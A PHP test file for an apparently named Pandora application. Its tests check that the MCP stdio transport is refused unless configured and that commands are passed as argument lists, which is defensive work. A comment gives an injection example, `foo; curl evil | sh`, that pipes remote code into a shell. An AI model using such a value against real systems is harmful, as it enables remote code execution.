<?php

declare(strict_types=1);

use Pandora\Exceptions\McpDenied;
use Pandora\Mcp\Enums\McpTransport;
use Pandora\Mcp\McpServer;
use Pandora\Mcp\Transport\HttpTransport;
use Pandora\Mcp\Transport\StdioTransport;
use Pandora\Mcp\Transport\TransportFactory;

/**
 * Phase 6, criterion 15 — stdio is refused unless explicitly enabled.
 *
 * stdio executes a local binary named by a database row, so write access to
 * one table becomes arbitrary local execution. The refusal is enforced in the
 * FACTORY rather than inside the transport, which is the part worth asserting:
 * a disabled transport is never constructed, so the code that spawns a process
 * is not one forgotten early-return away from running (ADR-0014).
 */
function mcpServerOn(string $transport): McpServer
{
    /** @var McpServer $server */
    $server = McpServer::query()->create([
        'name' => 'Ledger',
        'slug' => 'ledger-'.bin2hex(random_bytes(3)),
        'namespace' => 'ns'.bin2hex(random_bytes(3)),
        'transport' => $transport,
        'endpoint' => 'https://mcp.example.test/rpc',
        'command' => '/usr/local/bin/mcp-ledger',
    ]);

    return $server;
}

it('builds an HTTP transport, which ships enabled', function (): void {
    expect(app(TransportFactory::class)->for(mcpServerOn('http')))
        ->toBeInstanceOf(HttpTransport::class);
});

it('refuses stdio by default', function (): void {
    // The shipped default. A test that only ever ran with stdio enabled would
    // be testing the configuration nobody deploys.
    expect(config('pandora.mcp.transports.stdio.enabled'))->toBeFalse();

    app(TransportFactory::class)->for(mcpServerOn('stdio'));
})->throws(McpDenied::class);

it('names the configuration key in the refusal', function (): void {
    try {
        app(TransportFactory::class)->for(mcpServerOn('stdio'));
    } catch (McpDenied $e) {
        // An operator guessing which switch governs stdio is an operator who
        // enables more than they meant to.
        expect($e->getMessage())->toContain('pandora.mcp.transports.stdio.enabled')
            ->and($e->reason)->toBe('transport_disabled');

        return;
    }

    $this->fail('stdio was not refused.');
});

it('never constructs the process transport while it is disabled', function (): void {
    $built = null;

    try {
        $built = app(TransportFactory::class)->for(mcpServerOn('stdio'));
    } catch (McpDenied) {
        // Expected.
    }

    // The distinction that matters: not "it was built and then refused to
    // run", but "it was never built".
    expect($built)->toBeNull();
});

it('builds stdio once a deployment has said so', function (): void {
    config()->set('pandora.mcp.transports.stdio.enabled', true);

    expect(app(TransportFactory::class)->for(mcpServerOn('stdio')))
        ->toBeInstanceOf(StdioTransport::class);
});

it('refuses a transport a deployment has turned off', function (): void {
    config()->set('pandora.mcp.transports.http.enabled', false);

    app(TransportFactory::class)->for(mcpServerOn('http'));
})->throws(McpDenied::class);

it('passes the stdio command as an argument list rather than a shell string', function (): void {
    // A single command string would be split by a shell that also honours `;`,
    // `&&`, backticks and globs -- so a row containing `foo; curl evil | sh`
    // would be two commands. Asserted structurally, because the alternative is
    // executing the payload to find out.
    $source = (string) file_get_contents(__DIR__.'/../../src/Mcp/Transport/StdioTransport.php');

    expect($source)->toContain('new Process([$command, ...$arguments])')
        ->and($source)->not->toContain('Process::fromShellCommandline')
        ->and($source)->not->toContain('shell_exec')
        ->and($source)->not->toContain('proc_open');
});

it('knows each transport by its own configuration key', function (): void {
    expect(McpTransport::Http->configKey())->toBe('pandora.mcp.transports.http.enabled')
        ->and(McpTransport::Sse->configKey())->toBe('pandora.mcp.transports.sse.enabled')
        ->and(McpTransport::Stdio->configKey())->toBe('pandora.mcp.transports.stdio.enabled');
});
